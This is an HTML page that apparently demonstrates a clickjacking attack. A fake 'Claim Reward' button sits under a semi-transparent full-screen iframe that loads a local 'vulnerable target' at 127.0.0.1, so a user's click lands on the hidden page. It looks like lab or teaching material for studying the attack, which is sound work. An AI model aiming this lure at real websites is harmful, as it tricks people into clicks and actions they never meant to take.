<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking Overlay Demonstration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
        }

        .fake-button {
            position: fixed;
            top: 130px;
            left: 30px;
            z-index: 1;
        }

        .overlay {
            position: fixed;
            inset: 0;
            width: 100vw;
            height: 100vh;
            opacity: 0.25;
            z-index: 10;
            border: none;
        }
    </style>
</head>
<body>
    <h1>Congratulations!</h1>
    <p>Click below to claim your demonstration reward.</p>

    <button class="fake-button" type="button">
        Claim Reward
    </button>

    <iframe
        class="overlay"
        src="http://127.0.0.1:8085"
        title="Transparent vulnerable target">
    </iframe>
</body>
</html>
